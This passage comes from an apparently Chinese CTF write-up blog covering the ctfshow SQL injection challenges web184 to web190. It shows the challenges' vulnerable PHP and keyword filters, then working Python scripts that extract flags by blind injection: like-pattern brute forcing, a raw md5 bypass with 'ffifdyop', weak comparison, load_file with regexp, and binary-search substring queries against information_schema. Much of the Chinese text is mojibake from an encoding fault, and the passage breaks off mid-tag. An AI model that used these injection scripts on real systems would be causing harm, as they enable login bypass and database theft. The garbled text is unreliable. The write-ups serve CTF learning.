class="token function">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j in letter<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span><span class="token string">"ctfshow_user group by pass having pass like {}"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token operator">+</span><span class="token function">asc2hex</span><span class="token punctuation">(</span>flag<span class="token operator">+</span>j<span class="token operator">+</span><span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"$user_count = 1;"</span> in r<span class="token punctuation">:</span>            flag<span class="token operator">+</span><span class="token operator">=</span>j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>            <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">"}"</span><span class="token punctuation">:</span>                sys<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web185ã€186"><a href="#web185ã€186" class="headerlink" title="web185ã€186"></a>web185ã€186</h1><p><strong>è¿”å›é€»è¾‘</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span>  <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>mysqlä¸­çš„åˆ©ç”¨å­—ç¬¦ç»„åˆæˆçš„æ•°å­—ï¼š</strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201127190309995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>pythonè„šæœ¬ï¼š</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Author  : Yn8rt</span><span class="token comment" spellcheck="true"># @Time    : 2021/7/27 21:52</span><span class="token comment" spellcheck="true"># @Function:</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">createNum</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token string">"true"</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"true"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            num <span class="token operator">+=</span> <span class="token string">"+true"</span>    <span class="token keyword">return</span> num<span class="token keyword">def</span> <span class="token function">createstrNum</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>    _str <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> m<span class="token punctuation">:</span>        _str <span class="token operator">+=</span> <span class="token string">",chr("</span> <span class="token operator">+</span> createNum<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">")"</span>    <span class="token keyword">return</span> _str<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>url <span class="token operator">=</span> <span class="token string">"http://282b6260-a1f9-437d-98f1-a7fb46d977a5.challenge.ctf.show:8080/select-waf.php"</span>letter <span class="token operator">=</span> <span class="token string">"0123456789abcdefghijklmnopqrstuvwxyz-{}"</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow{"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> letter<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'tableName'</span><span class="token punctuation">:</span> <span class="token string">'ctfshow_user group by pass having pass like concat({})'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>createstrNum<span class="token punctuation">(</span>flag <span class="token operator">+</span> j <span class="token operator">+</span> <span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token comment" spellcheck="true"># print(res)</span>        <span class="token keyword">if</span> <span class="token string">"$user_count = 1;"</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">"}"</span><span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2021-07-28"><a href="#2021-07-28" class="headerlink" title="2021-07-28"></a>2021-07-28</h1><h1 id="web187â€”â€”md5-pass-true-ç»•è¿‡"><a href="#web187â€”â€”md5-pass-true-ç»•è¿‡" class="headerlink" title="web187â€”â€”md5($pass,true)ç»•è¿‡"></a>web187â€”â€”md5($pass,true)ç»•è¿‡</h1><p><strong>æŸ¥è¯¢è¯­å¥</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select count(*) from ctfshow_user where username = '$username' and password= '$password'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>è¿”å›é€»è¾‘</strong></p><pre class="line-numbers language-php"><code class="language-php">    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//åªæœ‰adminå¯ä»¥è·å¾—flag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">!=</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'ç”¨æˆ·åä¸å­˜åœ¨'</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„åˆ°<code>md5(string,true)</code>è¿™ä¸ªå‡½æ•°</p><p><code>md5(string,raw)</code>å…¶ä¸­rawå‚æ•°å¯é€‰ï¼Œä¸”æœ‰ä¸¤ç§é€‰æ‹©</p><ul><li>FALSEï¼š32ä½16è¿›åˆ¶çš„å­—ç¬¦ä¸²</li><li>TRUEï¼š16ä½åŸå§‹äºŒè¿›åˆ¶æ ¼å¼çš„å­—ç¬¦ä¸²</li></ul><p>å½“æœ‰trueè¿™ä¸ªå‚æ•°ï¼Œä¼šä»¥äºŒè¿›åˆ¶çš„å½¢å¼è¾“å‡º16ä¸ªå­—ç¬¦ã€‚è¿”å›çš„è¿™ä¸ªåŸå§‹äºŒè¿›åˆ¶ä¸æ˜¯æ™®é€šçš„<code>0 1</code>äºŒè¿›åˆ¶ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210728194838783.png" alt></p><p><strong>å†çœ‹ä¸‹ä¸€ä¸ªçŸ¥è¯†ç‚¹</strong></p><p>åœ¨mysqlé‡Œé¢ï¼Œåœ¨ç”¨ä½œå¸ƒå°”å‹åˆ¤æ–­æ—¶ï¼Œä»¥1å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“åšæ•´å‹æ•°ã€‚è¦æ³¨æ„çš„æ˜¯è¿™ç§æƒ…å†µæ˜¯å¿…é¡»è¦æœ‰å•å¼•å·æ‹¬èµ·æ¥çš„ï¼Œæ¯”å¦‚password=â€˜xxxâ€™ or â€˜1xxxxxxxxxâ€™ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºpassword=â€˜xxxâ€™ or 1 ï¼Œä¹Ÿå°±ç›¸å½“äºpassword=â€˜xxxâ€™ or trueï¼Œæ‰€ä»¥è¿”å›å€¼å°±æ˜¯trueã€‚å½“ç„¶åœ¨æˆ‘åæ¥æµ‹è¯•ä¸­å‘ç°ï¼Œä¸åªæ˜¯1å¼€å¤´ï¼Œåªè¦æ˜¯æ•°å­—å¼€å¤´éƒ½æ˜¯å¯ä»¥çš„ã€‚<br>å½“ç„¶å¦‚æœåªæœ‰æ•°å­—çš„è¯ï¼Œå°±ä¸éœ€è¦å•å¼•å·ï¼Œæ¯”å¦‚password=â€˜xxxâ€™ or 1ï¼Œé‚£ä¹ˆè¿”å›å€¼ä¹Ÿæ˜¯trueã€‚ï¼ˆxxxæŒ‡ä»£ä»»æ„å­—ç¬¦ï¼‰</p><p><strong>æ„é€ payload</strong></p><pre><code>$sql = &quot;select count(*) from ctfshow_user where username = &#39;admin&#39; and password= &#39;ffifdyop&#39;&quot;;$sql = &quot;select count(*) from ctfshow_user where username = &#39;admin&#39; and password= &#39;&#39;or&#39;6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b&#39;&quot;;</code></pre><p><strong>éšæ‰‹å†™ä¸ªå°è„šæœ¬å•Šï¼š</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Author  : Yn8rt</span><span class="token comment" spellcheck="true"># @Time    : 2021/7/28 20:02</span><span class="token comment" spellcheck="true"># @Function:</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://c523bc8a-a1eb-4c7b-81c2-915c52efa9bb.challenge.ctf.show:8080/select-waf.php'</span>url2 <span class="token operator">=</span> <span class="token string">' http://c523bc8a-a1eb-4c7b-81c2-915c52efa9bb.challenge.ctf.show:8080/api/'</span>payload <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span>    <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"ffifdyop"</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#r = requests.post(url=url,data=payload)</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url2<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web188â€”â€”MySQLä¸­çš„å¼±æ¯”è¾ƒ"><a href="#web188â€”â€”MySQLä¸­çš„å¼±æ¯”è¾ƒ" class="headerlink" title="web188â€”â€”MySQLä¸­çš„å¼±æ¯”è¾ƒ"></a>web188â€”â€”MySQLä¸­çš„å¼±æ¯”è¾ƒ</h1><p><strong>æŸ¥è¯¢è¯­å¥</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select pass from ctfshow_user where username = {$username}"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>è¿”å›é€»è¾‘</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//ç”¨æˆ·åæ£€æµ‹</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\'|\"/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'ç”¨æˆ·åéæ³•'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//å¯†ç æ£€æµ‹</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'å¯†ç åªèƒ½ä¸ºæ•°å­—'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//å¯†ç åˆ¤æ–­</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'ç™»é™†æˆåŠŸ'</span><span class="token punctuation">;</span>      <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>mysqlä¸­å­—æ¯ä¸æ•°å­—çš„æ¯”è¾ƒè¿‡ç¨‹ï¼š</strong></p><p>ä½ å¯ä»¥å°è¯•ä¸€ä¸‹åœ¨æ•°æ®åº“ä¸­ä½¿ç”¨è¿™æ ·çš„è¯­å¥ï¼š<br><code>select * from stu where name=0</code>å¾ˆæœ‰å¯èƒ½æ˜¯èƒ½æŸ¥è¯¢å‡ºä¸œè¥¿çš„ï¼Œå³ä½¿ä½ æ²¡æœ‰nameä¸º0çš„æ•°æ®</p><p>è¿™æ˜¯å› ä¸ºæ•°æ®åº“è¿›è¡Œäº†å¼±æ¯”è¾ƒï¼Œå®ƒ<strong>selectå‡ºæ‰€æœ‰nameæ˜¯ä»¥å­—æ¯ä¸ºå¼€å¤´çš„æ•°æ®</strong><br>ä»¥å­—æ¯ä¸ºå¼€å¤´çš„å­—ç¬¦å‹æ•°æ®åœ¨ä¸æ•°å­—å‹æ¯”è¾ƒæ—¶ï¼Œä¼šå¼ºåˆ¶è½¬åŒ–ä¸º0ï¼Œå†ä¸æ•°å­—æ¯”è¾ƒï¼ˆè¿™é‡Œå¾ˆç±»ä¼¼äºPHPçš„å¼±æ¯”è¾ƒï¼‰<br>å‡è®¾æˆ‘ä»¬usernameä¸º0ï¼Œé‚£ä¹ˆå°±ä¼šç›¸ç­‰ï¼Œä»è€ŒåŒ¹é…æˆåŠŸ</p><p>åœ¨è¿™é‡Œçš„passwordæ˜¯ç”¨0æ¥æ··å­—æ¯å¼€å¤´çš„<code>$row[&#39;pass&#39;]</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Author  : Yn8rt</span><span class="token comment" spellcheck="true"># @Time    : 2021/7/28 20:02</span><span class="token comment" spellcheck="true"># @Function:</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'challenge.ctf.show:8080/api/'</span>payload <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">#"username":"1||1",</span>    <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">,</span>    <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">}</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2021-7-30"><a href="#2021-7-30" class="headerlink" title="2021-7-30"></a>2021-7-30</h1><h1 id="web189â€”â€”load-fileç»“åˆregexpç›²æ³¨"><a href="#web189â€”â€”load-fileç»“åˆregexpç›²æ³¨" class="headerlink" title="web189â€”â€”load_fileç»“åˆregexpç›²æ³¨"></a>web189â€”â€”<code>load_file</code>ç»“åˆ<code>regexp</code>ç›²æ³¨</h1><p>hintsï¼šflagåœ¨api/<strong>index</strong>.phpæ–‡ä»¶ä¸­</p><p><a href="https://www.cnblogs.com/blacksunny/p/8060028.html" target="_blank" rel="noopener">mysql load_fileåœ¨æ•°æ®åº“æ³¨å…¥ä¸­ä½¿ç”¨</a></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Author  : Yn8rt</span><span class="token comment" spellcheck="true"># @Time    : 2021/7/30 15:48</span><span class="token comment" spellcheck="true"># @Function:</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">import</span> jsonurl <span class="token operator">=</span> <span class="token string">'http://6ef6bc21-0110-4f40-bb9e-d260d53faac1.challenge.ctf.show:8080/api/index.php'</span>flag <span class="token operator">=</span> <span class="token string">'ctfshow{'</span>letter <span class="token operator">=</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyz-{}'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> letter<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"if(load_file('/var/www/html/api/index.php')regexp('{}'),0,1)"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>flag <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"0"</span>        <span class="token punctuation">}</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(r)</span>        <span class="token keyword">if</span> <span class="token string">"å¯†ç é”™è¯¯"</span> <span class="token operator">==</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> <span class="token string">'}'</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ˜¯å¦æ³¨å…¥æˆåŠŸåˆ©ç”¨çš„æ˜¯mysqlä¸­çš„å¼±æ¯”è¾ƒçš„è¿”å›å€¼â€œå¯†ç é”™è¯¯â€</p><h1 id="web190â€”â€”boolç›²æ³¨"><a href="#web190â€”â€”boolç›²æ³¨" class="headerlink" title="web190â€”â€”boolç›²æ³¨"></a>web190â€”â€”boolç›²æ³¨</h1><p><strong>æŸ¥è¯¢è¯­å¥</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select pass from ctfshow_user where username = '{$username}'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>è¿”å›é€»è¾‘</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//å¯†ç æ£€æµ‹</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'å¯†ç åªèƒ½ä¸ºæ•°å­—'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//å¯†ç åˆ¤æ–­</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'ç™»é™†æˆåŠŸ'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>pythonè„šæœ¬</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Author  : Yn8rt</span><span class="token comment" spellcheck="true"># @Time    : 2021/7/30 16:16</span><span class="token comment" spellcheck="true"># @Function:</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://ba83b7e4-1f63-428d-aa58-589b7afe233a.challenge.ctf.show:8080/api/'</span>flag <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment" spellcheck="true"># æŸ¥æ•°æ®åº“</span>        payload <span class="token operator">=</span> <span class="token string">"database()"</span>        <span class="token comment" spellcheck="true"># æŸ¥è¡¨</span>        <span class="token comment" spellcheck="true"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment" spellcheck="true"># æŸ¥å­—æ®µ</span>        <span class="token comment" spellcheck="true"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"</span>        <span class="token comment" spellcheck="true"># æŸ¥flag</span>        <span class="token comment" spellcheck="true">#payload = "select group_concat(f1ag) from ctfshow_fl0g"</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> f<span class="token string">"admin' and if(ascii(substr(({payload}),{i},1))>{mid},1,0)='1"</span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>        <span class="token punctuation">}</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"å¯†ç é”™è¯¯"</span>  <span class="token operator">==</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 